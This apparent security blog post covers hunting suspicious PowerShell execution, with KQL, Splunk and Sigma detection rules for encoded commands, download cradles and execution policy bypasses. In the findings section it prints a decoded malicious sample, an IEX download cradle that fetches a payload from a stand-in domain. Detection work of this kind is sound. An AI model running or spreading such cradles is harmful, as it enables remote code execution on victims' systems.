---
layout: post
title: "Hunting Suspicious PowerShell Execution Patterns"
date: 2025-10-23
categories: threat-hunting powershell detection
tags: [powershell, windows, detection-engineering, sigma]
---

## Overview

PowerShell remains one of the most abused tools by adversaries for initial access, lateral movement, and execution. This post explores techniques for hunting suspicious PowerShell execution patterns in your environment.

## The Threat

Adversaries frequently use PowerShell because it's:
- **Pre-installed** on Windows systems
- **Highly versatile** for interacting with Windows APIs
- **Often trusted** by security controls
- **Capable of memory-only execution** (fileless attacks)

### Common Attack Patterns

1. **Encoded Commands** - Base64 encoding to evade detection
2. **Download Cradles** - Downloading and executing remote payloads
3. **Bypass Execution Policy** - `-ExecutionPolicy Bypass`
4. **Hidden Windows** - `-WindowStyle Hidden`

## Hunting Techniques

### 1. Identify Encoded PowerShell Commands

Look for PowerShell executions with the `-EncodedCommand` or `-enc` parameter:

```kusto
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "powershell.exe" or FileName =~ "pwsh.exe"
| where ProcessCommandLine contains "-enc"
    or ProcessCommandLine contains "-encodedcommand"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp desc
```

### 2. Detect Download Cradles

Common download methods used by attackers:

```powershell
# Suspicious patterns to hunt for:
# 1. Net.WebClient
# 2. Invoke-WebRequest with IEX
# 3. Invoke-RestMethod with IEX
# 4. Start-BitsTransfer
```

**Detection Query (Splunk SPL):**

```spl
index=windows sourcetype=WinEventLog:Security EventCode=4688
| where CommandLine LIKE "%Invoke-WebRequest%" OR
        CommandLine LIKE "%Net.WebClient%" OR
        CommandLine LIKE "%DownloadString%" OR
        CommandLine LIKE "%DownloadFile%"
| where CommandLine LIKE "%IEX%" OR CommandLine LIKE "%Invoke-Expression%"
| table _time, ComputerName, User, CommandLine
```

### 3. Hunt for Execution Policy Bypasses

```yaml
# Sigma Rule Example
title: PowerShell Execution Policy Bypass
status: experimental
description: Detects PowerShell execution with policy bypass
references:
    - https://attack.mitre.org/techniques/T1059/001/
tags:
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
        CommandLine|contains:
            - '-ExecutionPolicy Bypass'
            - '-ep bypass'
            - '-exec bypass'
    condition: selection
falsepositives:
    - Legitimate administrative scripts
    - Software deployment tools
level: medium
```

## Analysis Findings

During a recent hunt, I identified 23 instances of encoded PowerShell across 12 hosts:

| Host | Count | Pattern | Verdict |
|------|-------|---------|---------|
| WKS-001 | 8 | Encoded + Hidden Window | **Malicious** |
| WKS-042 | 5 | Download Cradle + IEX | **Malicious** |
| SRV-023 | 10 | Legitimate Admin Script | Benign |

### Decoded Malicious Sample

The suspicious command from WKS-001 decoded to:

```powershell
IEX (New-Object Net.WebClient).DownloadString('hxxp://malicious-domain[.]com/payload.ps1')
```

This is a classic download cradle fetching a second-stage payload.

## Detection Recommendations

1. **Enable PowerShell Script Block Logging** (Event ID 4104)
2. **Enable Module Logging** (Event ID 4103)
3. **Deploy the following detection rules:**
   - Monitor encoded commands
   - Flag execution policy bypasses
   - Alert on download cradles with IEX
4. **Baseline normal PowerShell usage** in your environment

## MITRE ATT&CK Mapping

- **T1059.001** - Command and Scripting Interpreter: PowerShell
- **T1027** - Obfuscated Files or Information
- **T1105** - Ingress Tool Transfer
- **T1218** - System Binary Proxy Execution

## Conclusion

PowerShell abuse continues to be a reliable indicator of compromise. By implementing comprehensive logging and deploying targeted detections, defenders can effectively hunt for malicious PowerShell activity.

**Key Takeaway:** Don't just block PowerShell - understand normal usage patterns and hunt for anomalies.

## References

- [MITRE ATT&CK - PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [Microsoft - PowerShell Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging)
- [FireEye - PowerShell Tradecraft](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html)

---

*Happy Hunting!*
